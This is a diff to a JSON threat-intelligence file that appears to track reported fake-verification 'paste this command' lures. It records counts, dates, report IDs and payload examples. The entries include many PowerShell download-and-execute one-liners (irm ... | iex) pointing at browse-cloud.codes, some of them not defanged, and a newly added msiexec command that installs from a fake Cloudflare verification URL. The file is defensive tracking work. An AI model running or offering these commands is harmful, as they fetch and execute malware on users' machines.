@@ -1,10 +1,10 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 128,
-    "ReportCount": 128,
+    "DistinctPayloadCount": 129,
+    "ReportCount": 129,
     "FirstSeen": "2026-11-10T09:55:19.073000+00:00",
-    "LastSeen": "2026-11-15T16:51:55.497000+00:00",
+    "LastSeen": "2026-11-15T20:19:32.973000+00:00",
     "ReportIds": [
       "cmwaikzu608q10omllivblirh",
       "cmwaila5l08ql0omlduekey7c",
@@ -133,7 +133,8 @@
       "cmwhax3kd0rrh0omldd1e514g",
       "cmwhdrkmr0skk0omlnjzy4s28",
       "cmwi2ffgu0wgc0omlvztx57aj",
-      "cmwi2o0iz0wl70omljttx6np4"
+      "cmwi2o0iz0wl70omljttx6np4",
+      "cmwia30sw0zni0omlamzgx2of"
     ],
     "PayloadExamples": [
       "irm 'browse-cloud.codes/013ce88bf8a96d89'|iex;",
@@ -177,6 +178,7 @@
       "irm 'browse-cloud.codes/e2a70f128e088e5a'|iex;",
       "irm 'browse-cloud.codes/ea55171f930bd17a'|iex;",
       "irm 'browse-cloud.codes/ebafc1c6261b57b5'|iex;",
+      "irm 'browse-cloud.codes/ec20c619766c98f4'|iex;",
       "irm 'browse-cloud.codes/f0e07856f01b4cda'|iex;",
       "irm 'browse-cloud.codes/f141a3fc3b742e21'|iex;",
       "irm 'browse-cloud.codes/f19c44dcc955c4eb'|iex;",
@@ -1121,6 +1123,19 @@
     ],
     "PayloadExamples": [
       "irm 'https://err12[.]online/MPN34CUssTOxul1S=9aa1f611e4d27fce' | iex;"
+    ]
+  },
+  {
+    "Pattern": "msiexec /i <URL> msiex...\n...ps://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiexec /i <URL> Verif...\nFake",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-15T20:17:10.453000+00:00",
+    "LastSeen": "2026-11-15T20:17:10.453000+00:00",
+    "ReportIds": [
+      "cmwi9zysw0zmv0omltdaab4by"
+    ],
+    "PayloadExamples": [
+      "msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiex...\n...ps://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ Verif...\nFake"
     ]
   },
   {
